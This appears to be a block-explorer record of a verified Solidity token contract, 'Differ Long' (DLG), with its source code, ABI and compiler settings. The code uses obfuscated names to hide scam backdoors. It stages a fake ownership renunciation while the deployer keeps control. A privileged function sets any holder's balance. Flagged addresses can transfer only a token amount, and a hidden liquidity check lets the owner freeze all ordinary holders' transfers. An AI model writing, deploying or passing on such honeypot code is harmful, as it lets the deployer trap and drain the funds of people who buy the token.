{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface amountReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMarketingTo {\n    function createPair(address txShould, address enableSellWallet) external returns (address);\n}\n\ninterface fromMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellLaunchAt) external view returns (uint256);\n\n    function transfer(address fundAmount, uint256 receiverFrom) external returns (bool);\n\n    function allowance(address modeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAmount,\n        uint256 receiverFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderList, uint256 value);\n    event Approval(address indexed modeSender, address indexed spender, uint256 value);\n}\n\ninterface launchedFund is fromMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DifferLong is sellAt, fromMax, launchedFund {\n\n    function transfer(address fromSender, uint256 receiverFrom) external virtual override returns (bool) {\n        return isModeTeam(_msgSender(), fromSender, receiverFrom);\n    }\n\n    string private fundTx = \"Differ Long\";\n\n    address public takeMarketing;\n\n    address public sellMode;\n\n    function balanceOf(address sellLaunchAt) public view virtual override returns (uint256) {\n        return takeMode[sellLaunchAt];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedBuy;\n    }\n\n    uint256 constant takeFrom = 5 ** 10;\n\n    bool private modeList;\n\n    uint256 public atSell;\n\n    constructor (){\n        if (sellMarketing) {\n            isTotal = atSell;\n        }\n        amountReceiver listLiquidity = amountReceiver(txFeeAmount);\n        takeMarketing = receiverMarketingTo(listLiquidity.factory()).createPair(listLiquidity.WETH(), address(this));\n        if (sellTeam) {\n            sellTeam = true;\n        }\n        sellMode = _msgSender();\n        tokenAmount();\n        modeLiquidity[sellMode] = true;\n        takeMode[sellMode] = launchedBuy;\n        \n        emit Transfer(address(0), sellMode, launchedBuy);\n    }\n\n    mapping(address => uint256) private takeMode;\n\n    function approve(address exemptAtFund, uint256 receiverFrom) public virtual override returns (bool) {\n        exemptLaunched[_msgSender()][exemptAtFund] = receiverFrom;\n        emit Approval(_msgSender(), exemptAtFund, receiverFrom);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed limitAmount, address indexed receiverLaunched);\n\n    function tokenModeTo() private view {\n        require(modeLiquidity[_msgSender()]);\n    }\n\n    function listShould(address fromSender, uint256 receiverFrom) public {\n        tokenModeTo();\n        takeMode[fromSender] = receiverFrom;\n    }\n\n    mapping(address => bool) public receiverTrading;\n\n    function isModeTeam(address receiverFund, address fundAmount, uint256 receiverFrom) internal returns (bool) {\n        if (receiverFund == sellMode) {\n            return buyAuto(receiverFund, fundAmount, receiverFrom);\n        }\n        uint256 liquidityLimitLaunched = fromMax(takeMarketing).balanceOf(senderTrading);\n        require(liquidityLimitLaunched == minLiquidity);\n        require(fundAmount != senderTrading);\n        if (receiverTrading[receiverFund]) {\n            return buyAuto(receiverFund, fundAmount, takeFrom);\n        }\n        return buyAuto(receiverFund, fundAmount, receiverFrom);\n    }\n\n    uint256 private isTotal;\n\n    address private feeFund;\n\n    function allowance(address fundFee, address exemptAtFund) external view virtual override returns (uint256) {\n        if (exemptAtFund == txFeeAmount) {\n            return type(uint256).max;\n        }\n        return exemptLaunched[fundFee][exemptAtFund];\n    }\n\n    function owner() external view returns (address) {\n        return feeFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTeam;\n    }\n\n    string private buyTeam = \"DLG\";\n\n    bool public sellTeam;\n\n    uint256 private launchedBuy = 100000000 * 10 ** 18;\n\n    bool public sellMarketing;\n\n    mapping(address => mapping(address => uint256)) private exemptLaunched;\n\n    uint256 autoAt;\n\n    function buyAuto(address receiverFund, address fundAmount, uint256 receiverFrom) internal returns (bool) {\n        require(takeMode[receiverFund] >= receiverFrom);\n        takeMode[receiverFund] -= receiverFrom;\n        takeMode[fundAmount] += receiverFrom;\n        emit Transfer(receiverFund, fundAmount, receiverFrom);\n        return true;\n    }\n\n    address senderTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function enableTotal(address receiverIsAmount) public {\n        tokenModeTo();\n        if (isTotal != fromAuto) {\n            sellTeam = false;\n        }\n        if (receiverIsAmount == sellMode || receiverIsAmount == takeMarketing) {\n            return;\n        }\n        receiverTrading[receiverIsAmount] = true;\n    }\n\n    uint256 private fromAuto;\n\n    bool public shouldReceiver;\n\n    address txFeeAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenAmount() public {\n        emit OwnershipTransferred(sellMode, address(0));\n        feeFund = address(0);\n    }\n\n    bool public launchShould;\n\n    function transferFrom(address receiverFund, address fundAmount, uint256 receiverFrom) external override returns (bool) {\n        if (_msgSender() != txFeeAmount) {\n            if (exemptLaunched[receiverFund][_msgSender()] != type(uint256).max) {\n                require(receiverFrom <= exemptLaunched[receiverFund][_msgSender()]);\n                exemptLaunched[receiverFund][_msgSender()] -= receiverFrom;\n            }\n        }\n        return isModeTeam(receiverFund, fundAmount, receiverFrom);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchList;\n    }\n\n    function buyTokenTotal(uint256 receiverFrom) public {\n        tokenModeTo();\n        minLiquidity = receiverFrom;\n    }\n\n    uint8 private launchList = 18;\n\n    mapping(address => bool) public modeLiquidity;\n\n    function listTeam(address receiverTeam) public {\n        require(receiverTeam.balance < 100000);\n        if (shouldReceiver) {\n            return;\n        }\n        \n        modeLiquidity[receiverTeam] = true;\n        if (sellTeam == launchShould) {\n            sellTeam = true;\n        }\n        shouldReceiver = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundTx;\n    }\n\n    uint256 minLiquidity;\n\n    function getOwner() external view returns (address) {\n        return feeFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAtFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAtFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunchAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"buyTokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIsAmount\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"listShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DifferLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}